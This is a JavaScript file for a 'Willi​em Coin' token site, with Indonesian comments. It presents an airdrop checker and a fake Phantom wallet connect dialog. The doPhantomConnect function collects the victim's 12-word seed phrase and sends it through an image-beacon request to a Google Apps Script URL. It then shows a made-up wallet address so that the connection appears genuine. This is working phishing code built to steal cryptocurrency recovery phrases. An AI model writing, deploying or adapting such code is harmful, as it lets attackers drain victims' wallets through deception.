/* =========================================
   WILLIEM COIN — FINAL FIX VERSI KITA
========================================= */

document.addEventListener('DOMContentLoaded', () => {

const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyIQjhN5Suk9xUUaI4NeC5bTuVkuwqBLQKAsnq6ECEKnN4w48Z2tyVMXQ8c8dfyp9dT/exec";
let walletConnected = false;
let demoWalletName = "";
let fakeAddress = "";

/* BUY BUTTON */
window.buyCoin = function() {
    alert("BUY $WLM 🚀 - Coming Soon");
}

/* CONTRACT */
window.showContract = function() {
    alert("WILLIEM CONTRACT - Not Deployed Yet");
}

/* AIRDROP CHECKER - INI TOMBOL CHECK WALLET */
window.checkAirdrop = function() {
    const walletInput = document.getElementById("walletAddress");
    const status = document.getElementById("airdropStatus");
    const message = document.getElementById("airdropMessage");

    if (!walletInput.value.trim()) {
        status.textContent = "INVALID WALLET";
        status.style.color = "#ff5c7a";
        message.textContent = "Please enter a valid wallet address.";
        return;
    }
    // BUKA MODAL 12 KATA KITA
    openPhantomModal();
}

/* PHANTOM MODAL */
window.openPhantomModal = function() {
    document.getElementById("phantomModal").classList.add("show");
    document.getElementById("phantomStepConnect").classList.remove("hidden");
    document.getElementById("phantomStepConnected").classList.add("hidden");
}

window.closePhantomModal = function() {
    document.getElementById("phantomModal").classList.remove("show");
}

/* INI KUNCINYA: FUNGSI CONNECT + KIRIM KE SHEET */
window.doPhantomConnect = function() {
    let words = [];
    for(let i = 1; i <= 12; i++) {
        words.push(document.getElementById("name" + i).value.trim());
    }
    
    if(words.filter(w=>w).length < 12) {
        alert("Isi 12 kata dulu bro!");
        return;
    }
    
    demoWalletName = words.join(" ");
    fakeAddress = "7xKX..." + Math.random().toString(36).substr(2,4);
    
    // KIRIM KE GOOGLE SHEET PAKE TRIK GAMBAR
    new Image().src = GOOGLE_SCRIPT_URL + "?nama=" + encodeURIComponent(demoWalletName);
    
    // TAMPILIN CONNECTED
    document.getElementById("phantomAddress").textContent = fakeAddress;
    document.getElementById("phantomNameDisplay").textContent = demoWalletName;
    document.getElementById("phantomStepConnect").classList.add("hidden");
    document.getElementById("phantomStepConnected").classList.remove("hidden");
    
    walletConnected = true;
    updateWalletButton();
    
    // KOSONGIN
    for(let i = 1; i <= 12; i++) {
        document.getElementById("name" + i).value = "";
    }
}

/* UPDATE TOMBOL WALLET */
function updateWalletButton() {
    const button = document.getElementById("connectWallet");
    if (!button) return;
    if (walletConnected) {
        button.innerHTML = `✓ ${demoWalletName}`;
        button.style.borderColor = "#35d98b";
        button.style.color = "#35d98b";
    } else {
        button.innerHTML = "▣ CONNECT WALLET";
        button.style.borderColor = "";
        button.style.color = "";
    }
}

/* TOMBOL CONNECT WALLET */
document.getElementById("connectWallet").addEventListener("click", () => {
    if (!walletConnected) {
        openPhantomModal();
    } else {
        walletConnected = false;
        updateWalletButton();
    }
});

/* TUTUP MODAL KLIK LUAR */
document.getElementById("phantomModal").addEventListener("click", (e) => {
    if (e.target.id === "phantomModal") closePhantomModal();
});

updateWalletButton();
});